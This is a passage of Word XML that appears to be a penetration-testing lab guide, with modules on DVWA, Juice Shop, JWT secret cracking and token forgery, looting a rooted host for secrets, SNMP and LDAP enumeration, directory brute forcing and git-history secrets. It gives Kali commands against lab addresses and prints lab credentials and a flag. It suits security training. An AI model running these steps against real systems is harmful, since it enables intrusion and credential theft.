      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Work DVWA through Burp on your own OS across the OWASP Top 10.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Target link: http://localhost:8081</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># browser on your own machine (Kali browser is terminal only):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   http://localhost:8081  -&gt; login admin / password  (Create/Reset Database if prompted)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   DVWA Security -&gt; Low</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   proxy browser through Burp on 127.0.0.1:8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   work SQLi, command injection, reflected + stored XSS, file upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Each vulnerability class is exploitable at Low.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Manual module: land at least one from each class, then mark done.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Modern Web (Juice Shop)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Grading: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>manual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Find the hidden score board and work the self-scoring challenge list.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Target link: http://localhost:3000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   http://localhost:3000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   find the hidden score board: http://localhost:3000/#/score-board</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   work challenges from the easy ones up (Juice Shop tracks solves itself)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding the score board is itself the first challenge.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Manual module: clear a few, then mark done.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. SSO Token Forgery (JWT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>14</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MODULE_ENT_JWT_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Get a user token, crack the HS256 secret offline, forge an admin token, read the admin-only flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Target link: http://localhost:8085</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://172.28.10.72/login              # returns a user JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># put the token in jwt.txt, then crack the signing secret:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hashcat -m 16500 jwt.txt /usr/share/wordlists/lab-passwords.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># forge an admin token with the recovered secret:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python3 -c "import jwt;print(jwt.encode({'user':'x','role':'admin'},'Summer2024',algorithm='HS256'))"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -H 'Authorization: Bearer &lt;forged&gt;' http://172.28.10.72/admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hashcat recovers the signing secret: Summer2024.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The /admin endpoint returns the flag only for role=admin.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="8A6D1A"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Phase 2: Internal · Pivot and Escalate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Post-Exploitation Pillaging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>12</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MODULE_12A_PILLAGE_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ (target root)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Loot the rooted perimeter host for configs and secrets; recover the build token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># with your root shell on 172.28.10.20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ls -la /root/ctf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>grep -ri 'pass\|secret\|token' /root/ctf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /root/ctf/app_config.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>app_config.php holds the build-token flag plus service-account creds (svcapp / Falcon2023!).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The build-token value is the flag; keep the svcapp credential for the next module.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>12. Vulnerability Scanning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>6</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MODULE_04B_VULNSCAN_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Assess the lab and find the SNMP device that leaks a maintenance token in its system description (sysDescr).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>snmpwalk -v2c -c public 172.28.20.40 1.3.6.1.2.1.1.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># or with nmap:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -sU -p161 --script snmp-sysdescr 172.28.20.40</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># assess the rest of the lab for your target list:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -sV --script vuln 172.28.10.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>net-01 (172.28.20.40) is reachable directly from Kali (Kali is dual-homed: 172.28.10.10 / 172.28.20.10).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The sysDescr string carries the flag after the model text.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The vuln scan also flags the real weaknesses (vsftpd backdoor, weak DB/VNC auth) for the exploitation modules.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>13. Directory Enumeration (LDAP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>6</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MODULE_ENT_LDAP_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Anonymously bind to the directory and read the service account whose description fields leak a password and an audit token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ldapsearch -x -H ldap://172.28.20.90 -b dc=pentesttv,dc=local</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ldap-01 (172.28.20.90) allows anonymous bind; the dump lists all staff and service accounts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>svc_backup has two description values: a password (ServiceB@ckup2024) and the audit-token flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>PENTESTTV{ldap_anon_bind_leaks_service_creds} (STATIC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>14. Web Content Discovery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>14</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MODULE_06C_WEBDISC_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Brute force the intranet directory structure to find an unlinked /backup path and read the file in it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Target link: http://localhost:8082</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gobuster dir -u http://172.28.20.130 -w /usr/share/wordlists/dirb/common.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://172.28.20.130/backup/flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>gobuster turns up /backup (also disclosed in http://172.28.20.130/robots.txt).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>flag.txt in that directory holds the flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>15. Secrets in Source Control</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>12</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MODULE_ENT_GIT_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Clone the repo and recover the API key from git history and the CI pipeline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Target link: http://localhost:8083</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>git clone http://172.28.20.131/webapp.git &amp;&amp; cd webapp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>git log --oneline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>git log -p config.py                        # or: git show &lt;first-commit&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
